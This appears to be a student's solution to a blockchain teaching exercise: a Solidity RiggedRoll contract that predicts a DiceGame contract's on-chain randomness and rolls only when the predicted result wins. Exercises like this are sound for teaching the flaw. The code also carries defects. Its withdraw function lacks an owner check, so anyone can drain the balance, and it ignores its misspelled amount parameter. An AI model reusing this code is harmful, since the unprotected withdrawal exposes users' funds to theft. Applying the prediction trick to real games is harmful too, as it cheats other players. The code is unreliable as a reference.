pragma solidity ^0.8.20; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error NotEnoughETH();
error NotAWinningRoll();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable to, uint256 amonut) external
    {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external
    {
        if (address(this).balance < 0.002 ether)
        {
            revert NotEnoughETH();
        }

        uint256 nextNonce = diceGame.nonce() + 1;

        uint256 random = uint256(
            keccak256(
                abi.encodePacked(
                    nextNonce,
                    block.timestamp,
                    block.difficulty,
                    address(this)
                )
            )
        );

        uint256 roll = random % 16;

        if (roll <= 5)
        {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
        else
        {
            revert NotAWinningRoll();
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
